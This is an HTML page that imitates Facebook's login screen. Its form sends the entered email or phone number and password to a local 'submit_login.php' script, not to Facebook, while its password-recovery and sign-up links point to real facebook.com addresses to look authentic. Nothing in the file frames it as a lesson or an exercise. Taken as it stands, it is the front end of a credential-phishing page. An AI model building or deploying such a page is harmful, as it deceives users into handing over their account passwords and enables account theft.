<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="facebook.css">
</head>
<body>
  <header>
    </header>
  <main>
    <form class="login-form" action="submit_login.php" method="post">
      <h2>Log in to Facebook</h2>
      <div class="login-fields">
        <label for="username">Email address or phone number</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit" class="log-in-button">Log in</button>
    </form>
    <div class="forgotten-password">
      <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
    </div>
    <div class="create-account">
      <p>New to Facebook? <a href="https://www.facebook.com/signup/">Create an account</a></p>
    </div>
  </main>
  <footer>
    </footer>
</body>
</html>
